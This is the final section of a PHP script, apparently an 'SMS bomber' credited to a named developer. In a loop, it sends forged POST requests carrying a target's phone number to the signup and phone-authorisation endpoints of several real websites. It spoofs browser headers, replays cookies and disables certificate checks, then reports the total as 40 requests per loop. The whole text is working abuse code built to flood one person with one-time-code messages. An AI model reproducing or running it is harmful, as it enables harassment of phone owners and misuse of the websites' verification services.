curl_setopt($Sender, CURLOPT_POSTFIELDS, 'id_customer=&back=&firstname=%D8%B9%D9%84%DB%8C&lastname=%D8%AE%D8%A7%D9%86%DB%8C&email=sdsfsdsds%40fdsfd.dfdfd&password=qqqqqq111&action=register&username='.$Phone.'&back=my-account&ajax=1');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://mendel-lab.com/account/authorize/phone";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
"Host: mendel-lab.com",
"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
"Accept: */*",
"Accept-Language: en-US,en;q=0.5",
"Accept-Encoding: gzip, deflate, br",
"Referer: https://mendel-lab.com/account/authorize?target=%2Faccount",
"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
"X-Requested-With: XMLHttpRequest",
"Content-Length: 17",
"Origin: https://mendel-lab.com",
"Connection: keep-alive",
"Cookie: _ga=GA1.2.467201207.1612538315; _gid=GA1.2.1434497285.1612538315; _gat_gtag_UA_140017216_1=1",
"TE: Trailers",
"Pragma: no-cache",
"Cache-Control: no-cache"
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'phone='.$Phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$Sender = curl_init();
$Sender_Url = "https://shop.khedmatgozaran.com/index.php";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
"Host: shop.khedmatgozaran.com",
"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
"Accept: */*",
"Accept-Language: en-US,en;q=0.5",
"Accept-Encoding: gzip, deflate, br",
"Referer: https://shop.khedmatgozaran.com/login?back=my-account",
"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
"X-Requested-With: XMLHttpRequest",
"Content-Length: 57",
"Origin: https://shop.khedmatgozaran.com",
"Connection: keep-alive",
"Cookie: PrestaShop-36b9beb3ecc80819d7d1625c66f91084=aSdYDGEbvKVpSqDpM5CHaiYSAJvC5u7FPNS408syXW8QzeSshg6WtkxEIKQMW6TutfDivLlkfU%2BpVWBYYIcHj%2FhHLACs4cMBBIEvdkHdHPoiYoT12X3FIdk3A0DdywfsNYnekB28msXMUdn4rRlVN2g5%2BMSp%2Ft4oOYTk4MMwu05n2uIGYEqsonZl4J4EtVFx5XzQtEC0YYR1AsybnSJ6w2g%2F9S41R83kU%2FaGpKBwZHA%3D000161; _ga=GA1.2.696510279.1612534065; _gid=GA1.2.1270425455.1612534065; _gat=1",
"Pragma: no-cache",
"Cache-Control: no-cache"
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'controller=authentication&SubmitLogin=1&email='.$Phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//end
$i++;
}
//============================================================================//
//Create Count Final
$all_request = $count * 40;
//============================================================================//
echo "$all_request OK Sended
";
//============================================================================//
//#<<<<<<<Developer>>>>>>>#//
//#https://github.com/Antrax-QG
//#telegram: @navidshams 
//============================================================================//
?>